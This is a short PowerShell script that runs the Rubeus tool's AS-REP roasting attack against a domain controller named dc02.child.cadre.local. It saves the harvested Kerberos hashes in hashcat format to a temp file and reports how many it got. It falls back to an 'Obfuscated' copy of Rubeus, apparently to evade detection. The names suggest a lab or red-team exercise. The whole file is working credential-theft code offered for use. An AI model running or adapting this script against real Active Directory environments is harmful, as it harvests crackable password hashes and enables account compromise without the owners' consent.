$ErrorActionPreference = 'Stop'
$rubeus = 'C:\Tools\ADTools\Rubeus.exe'
if (-not (Test-Path -LiteralPath $rubeus)) { $rubeus = 'C:\Tools\ADTools\Obfuscated\Rubeus.exe' }
if (-not (Test-Path -LiteralPath $rubeus)) { Write-Output 'RUBEUS_MISSING'; exit 1 }
$out = 'C:\Temp\intern_blue_asrep.txt'
if (Test-Path -LiteralPath $out) { Remove-Item -LiteralPath $out -Force }
& $rubeus asreproast /dc:dc02.child.cadre.local /outfile:$out /format:hashcat 2>&1 | Select-Object -Last 20
if (Test-Path -LiteralPath $out) {
    $count = (Get-Content -LiteralPath $out).Count
    Write-Output "ASREP_DONE count=$count"
} else {
    Write-Output 'ASREP_NO_OUTPUT'
}
